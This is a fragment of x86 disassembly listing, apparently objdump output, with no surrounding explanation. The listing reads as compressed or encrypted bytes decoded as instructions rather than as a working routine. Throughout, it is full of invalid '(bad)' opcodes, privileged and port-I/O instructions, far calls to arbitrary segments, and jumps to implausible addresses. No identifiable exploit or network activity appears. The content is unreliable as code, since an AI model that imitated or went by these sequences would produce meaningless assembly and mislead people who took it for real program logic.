  4262f8:	xchg   dl,ah
  4262fa:	retf   
  4262fb:	ins    BYTE PTR es:[edi],dx
  4262fc:	jbe    0x4262fe
  4262fe:	mov    dh,0x7e
  426300:	xor    BYTE PTR [ecx+eiz*2+0x15d175ca],bl
  426307:	inc    esp
  426308:	fmulp  st(1),st
  42630a:	adc    DWORD PTR [eax-0x29726d5e],ebx
	...
  426374:	push   esp
  426375:	and    eax,0xeefd4e8d
  42637a:	xlat   BYTE PTR ds:[ebx]
  42637b:	aas    
  42637c:	dec    ecx
  42637d:	sbb    esi,edi
  42637f:	or     eax,0x493c82c5
  426384:	call   0x4426520
  426389:	add    DWORD PTR [eax],eax
  42638b:	add    bh,ah
  42638d:	test   DWORD PTR [ebx],0x2e215942
  426393:	adc    al,0x1b
  426395:	in     eax,dx
  426396:	xor    cl,BYTE PTR [edx]
  426398:	pop    edx
  426399:	push   edi
  42639a:	(bad)  
  42639c:	lds    ecx,FWORD PTR [ecx+ecx*1+0x31ff3bc3]
  4263a3:	jb     0x426354
  4263a5:	(bad)  
  4263a6:	sub    ebp,DWORD PTR [edi-0x5d]
  4263a9:	and    BYTE PTR [ecx+ecx*8+0x55f78ea8],dl
  4263b0:	inc    ebx
  4263b1:	popf   
  4263b2:	or     dl,ch
  4263b4:	daa    
  4263b5:	(bad)  
  4263b6:	jmp    0x84a3b73a
  4263bb:	sbb    eax,0x17a954bb
  4263c0:	sub    BYTE PTR [esi+0x31],0xc4
  4263c4:	mov    al,ds:0x8e296c4b
  4263c9:	aas    
  4263ca:	mov    eax,ds:0x414ea046
  4263cf:	mov    ebx,0x9d636e9a
  4263d4:	fmul   DWORD PTR [edx+0xbf518d5]
  4263da:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4263db:	add    ah,BYTE PTR [eax-0x2b2d162a]
  4263e1:	out    dx,al
  4263e2:	call   0x39a0d35b
  4263e7:	mov    eax,edx
  4263e9:	imul   ebp,DWORD PTR [eax],0x14
  4263ec:	mov    ?,WORD PTR [ecx-0x28]
  4263ef:	and    ah,dl
  4263f1:	shr    DWORD PTR [ebx+0x73],1
  4263f4:	iret   
  4263f5:	bound  edx,QWORD PTR [esi]
  4263f7:	jge    0x426418
  4263f9:	in     eax,dx
  4263fa:	sub    al,0xb6
  4263fc:	fld    QWORD PTR [edi+ebx*1-0x1ef6d1d6]
  426403:	push   eax
  426404:	pushf  
  426405:	in     eax,0x43
  426407:	popf   
  426408:	mov    dh,0x64
  42640a:	outs   dx,BYTE PTR ds:[esi]
  42640b:	xchg   DWORD PTR [ebx+edi*4+0x68b3ae11],edi
  426412:	ins    BYTE PTR es:[edi],dx
  426413:	xchg   ebp,eax
  426414:	dec    edi
  426415:	pop    ss
  426416:	out    0x2f,al
  426418:	dec    ecx
  426419:	fwait
  42641a:	and    al,0xc9
  42641c:	push   ds
  42641d:	cmp    BYTE PTR [edx+0x4c],al
  426420:	push   edi
  426421:	mov    ebp,0x705c2487
  426426:	shl    BYTE PTR [edx],cl
  426428:	stc    
  426429:	lahf   
  42642a:	retf   0x67a4
  42642d:	mov    dl,0x2
  42642f:	sub    esi,DWORD PTR [edi+0x4734382c]
  426435:	fisttp QWORD PTR [esi+0x64]
  426438:	in     eax,dx
  426439:	popf   
  42643a:	mov    ah,0x50
  42643c:	repz and al,0xaf
  42643f:	xor    BYTE PTR [ebx-0x5e],0x83
  426443:	mov    ebp,0xb11e76a1
  426448:	fnsave [ebx+0x66]
  42644b:	dec    edi
  42644c:	(bad)  [edi+0x34]
  42644f:	aaa    
  426450:	(bad)  
  426451:	cmp    al,0x3c
  426453:	cmp    DWORD PTR [edi-0x1],ecx
  426456:	imul   ebp,DWORD PTR [edx-0x3a],0xace2e73
  42645d:	call   0x90ba:0x5f8c0a62
  426464:	sbb    eax,esi
  426466:	xor    eax,0x61cfa285
  42646b:	dec    edx
  42646c:	sbb    al,0x40
  42646e:	mov    eax,fs:0x959f5fd8
  426474:	pop    ebx
  426475:	and    BYTE PTR [ebx+0x6961e020],ch
  42647b:	adc    eax,0x5b3a248e
  426480:	shr    BYTE PTR [ebx-0x25972fc7],0x76
  426487:	cdq    
  426488:	cmp    BYTE PTR [esi],bh
  42648a:	ficom  WORD PTR [eax+0x63d6a410]
	...
  4264f4:	imul   ebp,DWORD PTR [edi-0x78],0xe9ef8e08
  4264fb:	outs   dx,DWORD PTR ds:[esi]
  4264fc:	vmwrite ecx,DWORD PTR [edx+0x56589185]
  426503:	sti    
  426504:	in     al,dx
  426505:	cwde   
  426506:	add    DWORD PTR [eax],eax
  426508:	add    al,0x1
  42650a:	add    BYTE PTR [eax],al
  42650c:	adc    dl,ah
  42650e:	pop    esp
  42650f:	lds    ecx,FWORD PTR [edi]
  426511:	into   
  426512:	mov    esp,0x451e2aaf
  426517:	xchg   esi,eax
  426518:	jns    0x4264a7
  42651a:	clc    
  42651b:	arpl   WORD PTR [esi],dx
  42651d:	pop    edi
  42651e:	xchg   esi,eax
  42651f:	jae    0x4264bb
  426521:	mov    fs,WORD PTR [edi+0x4b]
  426524:	mov    edx,0x9a76cd70
  426529:	loop   0x4264d8
  42652b:	aaa    
  42652c:	adc    edx,0x909111ad
  426532:	mov    ecx,DWORD PTR [eax-0x2d856480]
  426538:	cmp    DWORD PTR [esi-0x1b],eax
  42653b:	inc    esp
  42653c:	out    dx,al
  42653d:	arpl   WORD PTR [edi],ax
  42653f:	sbb    DWORD PTR [edi+0x74],esi
  426542:	cmp    dh,BYTE PTR [esi+0x58]
  426545:	mov    ds:0xec44cbaa,eax
  42654a:	cwde   
  42654b:	fwait
  42654c:	stc    
  42654d:	cwde   
  42654e:	add    DWORD PTR [edx+0x706e4f29],0xa1e41b6c
  426558:	and    bl,BYTE PTR [ecx*2+0x5420c6e0]
  42655f:	sub    sp,bx
  426562:	call   0xbd4848f
  426567:	outs   dx,DWORD PTR ds:[esi]
  426568:	hlt    
  426569:	xor    al,0xeb
  42656b:	sbb    ch,ch
  42656d:	bound  edi,QWORD PTR [edx+eax*8+0x34baf3f7]
  426574:	pop    ebp
  426575:	and    bl,BYTE PTR [esi+0x77]
  426578:	push   edi
  426579:	das    
  42657a:	xchg   ebx,eax
  42657b:	cdq    
  42657c:	js     0x4265bd
  42657e:	mov    al,0x7e
  426580:	pop    ecx
  426581:	(bad)  
  426583:	xchg   edx,eax
  426585:	pop    esp
  426586:	and    ecx,DWORD PTR [ebx+0x62]
  426589:	mov    ch,BYTE PTR [esi+0x39]
  42658c:	jecxz  0x426608
  42658e:	and    esi,edi
  426590:	loopne 0x42660b
  426592:	fs mov ah,0xad
  426595:	(bad)  
  426596:	popf   
  426597:	div    DWORD PTR [esi+0x56]
  42659a:	inc    ecx
  42659b:	(bad)  
  42659c:	repz aaa 
  42659e:	adc    cl,al
  4265a0:	and    cl,BYTE PTR [eax]
  4265a2:	sbb    BYTE PTR [eax-0x77],0xde
  4265a6:	stc    
  4265a7:	xchg   DWORD PTR [ebp+0x62],ecx
  4265aa:	mov    bl,0x3e
  4265ac:	sub    al,0xd
  4265ae:	jb     0x4265b1
  4265b0:	shl    esi,0x2c
  4265b3:	push   edx
  4265b4:	jmp    0xacc3c243
  4265b9:	rol    edx,0xf5
  4265bc:	ins    DWORD PTR es:[edi],dx
  4265bd:	xor    ecx,DWORD PTR [ebp-0xf]
  4265c0:	call   0xb567bb27
  4265c5:	sbb    dh,BYTE PTR [eax+edi*1]
  4265c8:	lock (bad) 
  4265ca:	jbe    0x42663a
  4265cc:	jg     0x426601
  4265ce:	pop    eax
  4265cf:	add    bh,BYTE PTR [ecx]
  4265d1:	sahf   
  4265d2:	jp     0x4265c2
  4265d4:	xor    al,0x85
  4265d6:	cld    
  4265d7:	jns    0x4265a8
  4265d9:	dec    ebp
  4265da:	hlt    
  4265db:	push   ebx
  4265dc:	xchg   esi,eax
  4265dd:	mov    cl,0xca
  4265df:	xor    BYTE PTR [edx],dl
  4265e1:	and    eax,eax
  4265e3:	sbb    al,0xe7
  4265e5:	(bad)  
  4265e7:	mov    ah,0x21
  4265e9:	push   edi
  4265ea:	jecxz  0x42659e
  4265ec:	sbb    BYTE PTR [eax-0x159cf9df],0x6b
  4265f3:	dec    esp
  4265f4:	jo     0x4265de
  4265f6:	jne    0x426641
  4265f8:	out    dx,al
  4265f9:	or     ecx,esp
  4265fb:	retf   
  4265fc:	add    eax,0x99a463eb
  426601:	mov    al,0x6d
  426603:	idiv   BYTE PTR [edx+0x15]
  426606:	mov    cl,0x16
  426608:	outs   dx,BYTE PTR ds:[esi]
  426609:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42660a:	(bad)
  42660e:	(bad)  
  42660f:	call   0x0:0x0
	...
  426672:	add    BYTE PTR [eax],al
  426674:	adc    cl,bl
  426676:	sbb    DWORD PTR [edx],0xcb9b5ad9
  42667c:	pop    DWORD PTR [edi+0x1eae6da4]
  426682:	mov    esi,0x199f0c6
  426687:	add    BYTE PTR [ecx+eax*1],al
  42668a:	add    BYTE PTR [eax],al
  42668c:	xchg   edx,eax
  42668d:	or     cl,BYTE PTR [ecx+0x41a3c49a]
  426693:	bound  eax,QWORD PTR [edx]
  426695:	dec    esi
  426696:	(bad)  
  426697:	into   
  426698:	jnp    0x42667e
  42669a:	mov    ch,0x58
  42669c:	adc    ecx,DWORD PTR [ecx]
  42669e:	mov    ecx,0xe5705d51
  4266a3:	nop
  4266a4:	mov    edi,0xaa7e811e
  4266a9:	std    
  4266aa:	jle    0x42671e
  4266ac:	add    BYTE PTR [edi+0x3cae1511],dh
  4266b2:	jmp    0xe7f94fc9
  4266b7:	or     al,0xf9
  4266b9:	dec    edi
  4266ba:	dec    edx
  4266bb:	cmp    bh,BYTE PTR [edx]
  4266bd:	adc    eax,ecx
  4266bf:	test   DWORD PTR [edi-0x14],edx
  4266c2:	mov    edi,0x8e33eee2
  4266c7:	sbb    eax,0x3efd0022
  4266cc:	pop    eax
  4266cd:	sar    DWORD PTR [edi],1
  4266cf:	outs   dx,DWORD PTR ds:[esi]
  4266d0:	out    dx,eax
  4266d1:	cmp    al,0x7b
  4266d3:	pop    eax
  4266d4:	bound  edx,QWORD PTR [eax]
  4266d6:	les    esp,FWORD PTR [ecx]
  4266d8:	loop   0x42673b
  4266da:	jge    0x42671a
  4266dc:	fcomp  QWORD PTR [ebx]
  4266de:	xchg   ebx,eax
  4266df:	sbb    eax,0x13f8167d
  4266e4:	clc    
  4266e5:	push   edx
  4266e6:	and    ecx,edi
  4266e8:	add    eax,DWORD PTR [edx]
  4266ea:	(bad)  ds:0x42aed4d0
  4266f0:	stos   DWORD PTR es:[edi],eax
  4266f1:	in     al,0x22
  4266f3:	popf   
  4266f4:	and    BYTE PTR [edi+0x5b],al
  4266f7:	nop
  4266f8:	in     eax,0x80
  4266fa:	test   al,0x9a
  4266fc:	xchg   edx,eax
  4266fd:	dec    esi
  4266fe:	bnd jge 0x426770
  426701:	adc    eax,0x40cf6aa
  426706:	shl    BYTE PTR [ecx-0x65bb0f2e],0x35
  42670d:	sub    edx,esp
  42670f:	and    DWORD PTR ds:0xd732ed03,ebp
  426715:	xchg   ebp,eax
  426716:	adc    DWORD PTR [edx],0x36
  426719:	ins    DWORD PTR es:[edi],dx
  42671a:	xchg   esp,eax
  42671b:	mov    eax,0x18b5a0db
  426720:	mov    bl,0x5d
  426722:	mov    cl,0x7f
  426724:	cmp    BYTE PTR [edi-0x747d2259],0x12
  42672b:	stos   BYTE PTR es:[edi],al
  42672c:	jnp    0x4266f2
  42672e:	cwde   
  42672f:	mov    bh,BYTE PTR [eax]
  426731:	sti    
  426732:	xchg   edx,eax
  426733:	jo     0x4266f8
  426735:	into   
  426736:	ficomp WORD PTR [edx+0x43]
  426739:	fwait
  42673a:	in     al,0x79
  42673c:	sbb    esp,edi
  42673e:	xchg   DWORD PTR [esi-0xb],edi
  426741:	rcr    BYTE PTR [edi],0xa7
  426744:	add    BYTE PTR [edi+0x45],0x4e
  426748:	mov    eax,ds:0xb523d3b6
  42674d:	outs   dx,BYTE PTR ds:[esi]
  42674e:	sbb    DWORD PTR [edx],esi
  426750:	pop    edx
  426751:	lds    esp,FWORD PTR [ebx]
  426753:	xchg   DWORD PTR [ebp+0x60a0f46d],ebp
  426759:	cwde   
  42675a:	jnp    0x4266e5
  42675c:	sub    ecx,0xffffff87
  42675f:	or     BYTE PTR [ebp+edi*2-0x6f],0x69
  426764:	jle    0x4266f2
  426766:	inc    edi
  426767:	jg     0x4266f8
  426769:	pop    ebx
  42676a:	mov    ds:0x7f169da1,eax
  42676f:	adc    eax,0x203ed755
  426774:	ret    
  426775:	mov    bl,0x4c
  426777:	(bad)  
  42677a:	fisttp WORD PTR [ebx+0x632936cb]
  426780:	jmp    0xedea:0xe762f061
  426787:	cmp    cl,BYTE PTR cs:[edx+0x5a9a33c0]
  42678e:	sti    
  42678f:	dec    eax
	...
  4267f4:	mov    eax,0xff2ace8d
  4267f9:	imul   edi,esp,0xffffff9f
  4267fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4267fd:	and    dh,0xca
  426800:	mov    ds:0xf471fc19,al
  426805:	call   0x0:0x1040001
  42680c:	ficomp WORD PTR [ebx-0x5d]
  42680f:	out    dx,al
  426810:	repnz dec cl
  426813:	int    0xc7
  426815:	iret   
  426816:	push   ss
  426817:	cmp    ebx,DWORD PTR [ecx+0x1901a6ab]
  42681d:	fmul   QWORD PTR [edi+0x682fdb81]
  426823:	sub    ebx,DWORD PTR [ecx-0x7]
  426826:	mov    dl,BYTE PTR [ecx]
  426828:	mov    eax,ds:0xdbda64a1
  42682d:	xchg   esp,eax
  42682e:	mov    ch,0xbe
  426830:	bound  ebp,QWORD PTR [ebx+0x6f1699c8]
  426836:	add    ah,al
  426838:	out    dx,al
  426839:	fisubr WORD PTR [eax+0x14]
  42683c:	pop    edi
  42683d:	pusha  
  42683e:	fdiv   QWORD PTR [eax+ebp*1-0x1b870acc]
  426845:	adc    bh,BYTE PTR [ebp+0x3c26a10a]
  42684b:	js     0x426810
  42684d:	cwde   
  42684e:	popa   
  42684f:	jmp    0xc8ed:0xb593d2ce
  426856:	sar    BYTE PTR [esi-0x16ea335a],1
  42685c:	mov    ebx,0xca7f02db
  426861:	push   ebx
  426862:	adc    DWORD PTR [ecx+0x51c99b2b],ebp
  426868:	(bad)  
  426869:	mov    esi,0x491ec836
  42686e:	mov    ebx,0xcf749c55
  426873:	out    0x70,al
  426875:	call   0x7cd3ccb5
  42687a:	mov    edx,DWORD PTR [edx*1-0x60ad86c9]
  426881:	popf   
  426882:	add    cl,BYTE PTR [ebp-0x5a]
  426885:	fmul   DWORD PTR [eax]
  426887:	lods   al,BYTE PTR ds:[esi]
  426888:	call   DWORD PTR [ebx]
  42688a:	out    dx,al
  42688b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42688c:	xchg   ecx,eax
  42688d:	push   ecx
  42688e:	or     eax,0x1d786500
  426893:	stos   DWORD PTR es:[edi],eax
  426894:	adc    eax,0x5f395e33
  426899:	jb     0x4268c8
  42689b:	mov    DWORD PTR [ebx],esi
  42689d:	mov    ds:0xa08572a5,eax
  4268a2:	dec    edx
  4268a3:	dec    ebx
  4268a4:	int    0x28
  4268a6:	xchg   esp,eax
  4268a7:	daa    
  4268a8:	mov    ds:0xbd1bcdaa,eax
  4268ad:	outs   dx,DWORD PTR ds:[esi]
  4268ae:	fs cld 
  4268b0:	(bad)  
  4268b2:	inc    edi
  4268b3:	mov    esi,0x3d7291bf
  4268b8:	dec    ebp
  4268b9:	and    BYTE PTR [ebx-0x1f],bh
  4268bc:	das    
  4268bd:	mov    fs,WORD PTR [ecx+0x29]
  4268c0:	cmp    BYTE PTR [edx-0x64],0xe4
  4268c4:	sub    al,0x55
  4268c6:	push   ecx
  4268c7:	shl    BYTE PTR [ecx],1
  4268c9:	add    eax,0x2c2871ac
  4268ce:	das    
  4268cf:	mov    bh,0x7a
  4268d1:	das    
  4268d2:	add    esp,DWORD PTR [eax]
  4268d4:	pop    ss
  4268d5:	test   al,0x4e
  4268d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4268d8:	jmp    DWORD PTR [ebx-0x54c8adc8]
  4268de:	xchg   edx,eax
  4268df:	adc    al,0x6f
  4268e1:	dec    esp
  4268e2:	mov    edi,0x5bc4fa32
  4268e7:	inc    edi
  4268e8:	mov    ebp,0x688d1722
  4268ed:	jno    0x42689a
  4268ef:	adc    eax,0x8e753471
  4268f4:	dec    eax
  4268f5:	sbb    al,0xde
  4268f7:	aas    
  4268f8:	int3   
  4268f9:	cmp    bl,BYTE PTR [edi-0x40c7005b]
  4268ff:	dec    edi
  426900:	loopne 0x426892
  426902:	and    eax,0x4fb8a412
  426907:	and    ch,BYTE PTR [esi+0x615f614c]
  42690d:	ret    0x42b5
	...
  426974:	mov    WORD PTR [esi+0x7d],cs
  426977:	jge    0x426978
  426979:	jg     0x426907
  42697b:	jmp    FWORD PTR [ebx]
  42697d:	in     al,dx
  42697e:	lahf   
  42697f:	mov    eax,DWORD PTR ds:0xf8f94e02
  426985:	fwait
  426986:	add    DWORD PTR [eax],eax
  426988:	add    al,0x1
  42698a:	add    BYTE PTR [eax],al
  42698c:	and    eax,0xa232bffa
  426991:	xlat   BYTE PTR ds:[ebx]
  426992:	xchg   ebx,eax
  426993:	sbb    al,0x84
  426995:	std    
  426996:	xchg   ebx,eax
  426997:	dec    eax
  426998:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426999:	(bad)  
  42699b:	xor    ah,al
  42699d:	push   ebx
  42699e:	mov    ch,0xf7
  4269a0:	or     eax,0xb32f9891
  4269a5:	enter  0xdb32,0x4
  4269a9:	xchg   DWORD PTR ss:[ebx-0x1f5fae0b],edi
  4269b0:	pop    esi
  4269b1:	retf   0xc219
  4269b4:	push   0xbd69c486
  4269b9:	inc    esp
  4269ba:	cmp    BYTE PTR [ebx-0x5867737d],0xf
  4269c1:	mov    ah,0x9c
  4269c3:	mov    ds:0xc2110e14,eax
  4269c8:	test   al,0xf6
  4269ca:	pop    edi
  4269cb:	or     al,0xc2
  4269cd:	out    dx,al
  4269ce:	cli    
  4269cf:	mov    ecx,DWORD PTR [ecx+esi*4]
  4269d2:	jbe    0x42695f
  4269d4:	sbb    dh,dl
  4269d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4269d7:	push   esp
  4269d8:	mov    bh,BYTE PTR [esi-0x358e94c3]
  4269de:	sbb    DWORD PTR [esi-0x56],esp
  4269e1:	jg     0x4269fd
  4269e3:	and    eax,0xc6e2957d
  4269e8:	dec    eax
  4269e9:	icebp  
  4269ea:	ins    DWORD PTR es:[edi],dx
  4269eb:	addr16 pop eax
  4269ed:	inc    edx
  4269ee:	inc    ebp
  4269ef:	cmp    dh,BYTE PTR [edi]
  4269f1:	cs jl  0x426976
  4269f4:	add    al,0x5c
  4269f6:	cmp    cl,BYTE PTR [esi]
  4269f8:	sub    DWORD PTR [ebx-0x7b],ebp
  4269fb:	(bad)
  4269ff:	ss sub eax,0x38142df1
  426a05:	stos   DWORD PTR es:[edi],eax
  426a06:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426a07:	jl     0x426a50
  426a09:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426a0a:	jnp    0x426a45
  426a0c:	pop    eax
  426a0d:	lahf   
  426a0e:	and    al,0x14
  426a10:	sbb    ch,bl
  426a12:	jp     0x426a67
  426a14:	inc    eax
  426a15:	je     0x426a8b
  426a17:	iret   
  426a18:	dec    ecx
  426a19:	stc    
  426a1a:	add    dl,ah
  426a1c:	jg     0x4269f3
  426a1e:	mov    dl,0x4f
  426a20:	(bad)  
  426a21:	push   esi
  426a22:	and    cl,BYTE PTR [ebp-0x6566127e]
  426a28:	pop    ss
  426a29:	popa   
  426a2a:	or     BYTE PTR [esi],dl
  426a2c:	mov    cl,0x9
  426a2e:	adc    ch,cl
  426a30:	pop    es
  426a31:	out    dx,al
  426a32:	mov    ecx,0xf2e031e5
  426a37:	dec    ebp
  426a38:	fistp  DWORD PTR [edx-0x3ba6ee46]
  426a3e:	push   ds
  426a3f:	into   
  426a40:	scas   al,BYTE PTR es:[edi]
  426a41:	fdiv   st(6),st
  426a43:	gs in  al,0xc4
  426a46:	hlt    
  426a47:	adc    DWORD PTR [ebp+0xc],esp
  426a4a:	inc    edx
  426a4b:	pop    ds
  426a4c:	push   ebp
  426a4d:	hlt    
  426a4e:	popf   
  426a4f:	mov    esp,0x75c7b3d7
  426a54:	aas    
  426a55:	popf   
  426a56:	or     DWORD PTR ds:[edi+0x77],ebp
  426a5a:	sub    dl,BYTE PTR [eax-0x72]
  426a5d:	cwde   
  426a5e:	sahf   
  426a5f:	aas    
  426a60:	push   ss
  426a61:	push   cs
  426a62:	inc    esi
  426a63:	call   0x6ad753c
  426a68:	jb     0x426a0a
  426a6a:	imul   ebx
  426a6c:	push   eax
  426a6d:	or     edi,DWORD PTR ds:0x73795db
  426a73:	dec    edx
  426a74:	mov    eax,0x3498835
  426a79:	sahf   
  426a7a:	xcrypt-cfb (bad)
  426a7b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426a7c:	and    dh,ch
  426a7e:	xchg   edi,eax
  426a7f:	(bad)  
  426a81:	je     0x426a77
  426a83:	and    esi,DWORD PTR [esi-0xe]
  426a86:	jo     0x426a56
  426a88:	sbb    eax,0xf3dad6f1
  426a8d:	out    dx,al
  426a8e:	sar    BYTE PTR [edx+0x0],1
	...
  426af4:	cdq    
  426af5:	sub    BYTE PTR ds:0xdb77bd56,cl
  426afb:	out    dx,eax
  426afc:	inc    esi
  426afd:	sub    DWORD PTR [esi],edi
  426aff:	or     al,0xf0
  426b01:	jmp    0x9d3f5256
  426b06:	add    DWORD PTR [eax],eax
  426b08:	add    al,0x1
  426b0a:	add    BYTE PTR [eax],al
  426b0c:	mov    dl,0x52
  426b0e:	sbb    DWORD PTR [ebx+0x37453aa6],esi
  426b14:	add    al,0x7f
  426b16:	sub    BYTE PTR [esi-0x31b18062],ah
  426b1c:	in     eax,0xf2
  426b1e:	pushf  
  426b1f:	or     BYTE PTR [esi+0x279113a4],dh
  426b25:	sub    bh,BYTE PTR [edi]
  426b27:	inc    ecx
  426b28:	cld    
  426b29:	call   0x9876:0x94e4d285
  426b30:	fadd   DWORD PTR [ebp-0x5cfea6bc]
  426b36:	jl     0x426b45
  426b38:	jne    0x426ad7
  426b3a:	ret    0x9b9b
  426b3d:	pop    ebx
  426b3e:	out    0x3f,al
  426b40:	sar    BYTE PTR ds:0x80dcd64b,0xaa
  426b47:	cmp    bh,BYTE PTR [ecx+0x42]
  426b4a:	dec    ecx
  426b4b:	fistp  QWORD PTR [esi]
  426b4d:	popf   
  426b4e:	adc    al,bh
  426b50:	retf   
  426b51:	jno    0x426b29
  426b53:	sub    ah,BYTE PTR [eax-0xd]
  426b56:	mov    ebp,0xc87bc8e1
  426b5b:	shl    DWORD PTR [ebx-0x37],1
  426b5e:	pop    ecx
  426b5f:	sub    al,0x56
  426b61:	cwde   
  426b62:	mov    dh,0xd2
  426b64:	jmp    0x426b3e
  426b66:	fld    st(1)
  426b68:	mov    esi,0x75287b3e
  426b6d:	mov    BYTE PTR [ebp+esi*4+0x73],bh
  426b71:	cmp    BYTE PTR [ebp+0x3bf46aae],ah
  426b77:	xchg   BYTE PTR ds:0xbaf6bd62,bl
  426b7d:	mov    eax,0xc3767104
  426b82:	rol    DWORD PTR [edx],1
  426b84:	jg     0x426c01
  426b86:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426b87:	mov    eax,ds:0x277fe841
  426b8c:	jmp    0xb9cc5a97
  426b91:	or     eax,0x4f97c21c
  426b96:	call   0x5e9fe331
  426b9b:	(bad)  [edx]
  426b9d:	outs   dx,BYTE PTR ds:[esi]
  426b9e:	adc    eax,0x96c310e6
  426ba3:	ds pusha 
  426ba5:	test   eax,0xdaccbfa2
  426baa:	push   edi
  426bab:	gs lahf 
  426bad:	iret   
  426bae:	adc    cl,BYTE PTR [ebp-0x23be54ec]
  426bb4:	mov    esi,0x6673d0c3
  426bb9:	sar    DWORD PTR [eax+ebp*4+0x46869591],1
  426bc0:	jbe    0x426c23
  426bc2:	loopne 0x426c28
  426bc4:	xchg   ebp,eax
  426bc5:	(bad)  
  426bc6:	clc    
  426bc7:	sar    BYTE PTR [eax+edx*4+0x1],0xd4
  426bcc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426bcd:	lods   al,BYTE PTR ds:[esi]
  426bce:	inc    eax
  426bcf:	adc    BYTE PTR [eax],bl
  426bd1:	pop    ds
  426bd2:	loop   0x426c48
  426bd4:	int    0xe6
  426bd6:	int3   
  426bd7:	xor    eax,0x9d95b43b
  426bdc:	lock xchg edx,eax
  426bde:	pop    edi
  426bdf:	add    bh,dl
  426be1:	and    esi,ecx
  426be3:	scas   al,BYTE PTR es:[edi]
  426be4:	test   DWORD PTR [ebp+0x4],ebp
  426be7:	push   ebp
  426be8:	and    BYTE PTR [ecx-0x4b],ch
  426beb:	cmp    DWORD PTR [edi],0x411414ab
  426bf1:	int3   
  426bf2:	adc    esp,edi
  426bf4:	cmp    al,0x90
  426bf6:	jo     0x426c4e
  426bf8:	dec    esi
  426bf9:	(bad)  
  426bfa:	int3   
  426bfb:	sub    DWORD PTR [ebp-0x5],eax
  426bfe:	fmul   DWORD PTR [edx]
  426c00:	pop    ss
  426c01:	xchg   edi,eax
  426c02:	into   
  426c03:	add    cl,bh
  426c05:	pop    edx
  426c06:	pop    edi
  426c07:	jns    0x426bec
  426c09:	jb     0x426bdd
  426c0b:	imul   DWORD PTR [esi]
  426c0d:	stc    
  426c0e:	mov    dl,0xcc
	...
  426c74:	loop   0x426cd6
  426c76:	test   DWORD PTR [esi+0x74f3f787],esi
  426c7c:	mov    ah,0xeb
  426c7e:	cld    
  426c7f:	mov    edx,0x71280e6c
  426c84:	add    BYTE PTR [esi+0x1040001],bl
  426c8a:	add    BYTE PTR [eax],al
  426c8c:	push   0xe06bc948
  426c91:	pop    esi
  426c92:	out    dx,eax
  426c93:	mov    bl,0x7d
  426c95:	(bad)  [ebx-0x1d]
  426c98:	xchg   edi,eax
  426c99:	in     al,dx
  426c9a:	mov    al,ds:0x55026f1a
  426c9f:	add    BYTE PTR [esi+0x52127e67],bh
  426ca5:	cmp    al,0x4d
  426ca7:	mov    edx,0x834c42a0
  426cac:	into   
  426cad:	cli    
  426cae:	clc    
  426caf:	lea    ebx,[ecx-0x28]
  426cb2:	cli    
  426cb3:	mov    DWORD PTR [edx-0x50],ebx
  426cb6:	rcr    BYTE PTR [ecx+0x67c40f05],0x5d
  426cbd:	sub    BYTE PTR ds:0x5301a4d7,ah
  426cc3:	jae    0x426cd9
  426cc5:	xchg   bx,ax
  426cc7:	call   0xbced:0x7d2146d6
  426cce:	dec    esi
  426ccf:	cs nop
  426cd1:	test   al,0xdb
  426cd3:	mov    eax,ds:0x7e6fffc0
  426cd8:	ja     0x426d08
  426cda:	outs   dx,DWORD PTR ds:[esi]
  426cdb:	inc    esi
  426cdc:	shl    BYTE PTR [edx+0x73],0xcf
  426ce0:	jmp    0x426ca1
  426ce2:	icebp  
  426ce3:	hlt    
  426ce4:	test   eax,0x92e87ea4
  426ce9:	shl    BYTE PTR [esi],1
  426ceb:	xchg   ebp,eax
  426cec:	data16 or bl,BYTE PTR [esi]
  426cef:	mov    cl,0x99
  426cf1:	add    dl,BYTE PTR [ebp+0x3a9baf4d]
  426cf7:	push   ebx
  426cf8:	stos   DWORD PTR es:[edi],eax
  426cf9:	retf   0xe8fd
  426cfc:	ja     0x426d55
  426cfe:	and    eax,0x7c23ab8b
  426d03:	jl     0x426cec
  426d05:	leave  
  426d06:	add    dh,bl
  426d08:	int3   
  426d09:	sbb    DWORD PTR [ebp-0x8],edx
  426d0c:	scas   al,BYTE PTR es:[edi]
  426d0d:	pop    ss
  426d0e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426d0f:	sar    BYTE PTR [edx],1
  426d11:	and    BYTE PTR [ebx-0x42],ah
  426d14:	add    dl,BYTE PTR [edi]
  426d16:	mov    dl,0x10
  426d18:	rol    ah,1
  426d1a:	jo     0x426d88
  426d1c:	or     cl,bh
  426d1e:	or     DWORD PTR [eax-0x4c],edx
  426d21:	(bad)  
  426d22:	jnp    0x426cf9
  426d24:	fsub   DWORD PTR [ecx]
  426d26:	mov    al,ds:0x5e1ce52
  426d2b:	push   ss
  426d2c:	fld    QWORD PTR [ecx]
  426d2e:	(bad)  [eax+0x4607654a]
  426d34:	jne    0x426da6
  426d36:	(bad)  
  426d37:	fisubr WORD PTR [eax]
  426d39:	pop    es
  426d3a:	push   ebx
  426d3b:	lea    ebp,[edx-0x79]
  426d3e:	jg     0x426d55
  426d40:	fimul  WORD PTR [ecx+0x6c]
  426d43:	hlt    
  426d44:	int    0x80
  426d46:	and    al,0x6e
  426d48:	pop    ecx
  426d49:	ret    
  426d4a:	retf   0x8e19
  426d4d:	test   eax,0x5966ab82
  426d52:	and    eax,0xd66aebeb
  426d57:	mov    ecx,0x3c2b4421
  426d5c:	dec    eax
  426d5d:	pop    ebp
  426d5e:	inc    eax
  426d5f:	jecxz  0x426dc8
  426d61:	fisubr WORD PTR [ecx]
  426d63:	cmp    BYTE PTR [esp+edi*8-0x5],0xab
  426d68:	jne    0x426d0d
  426d6a:	dec    ecx
  426d6b:	xor    eax,0x3411205d
  426d70:	pop    ecx
  426d71:	outs   dx,DWORD PTR ds:[esi]
  426d72:	inc    ebp
  426d73:	push   edx
  426d74:	pop    esi
  426d75:	xor    edi,edx
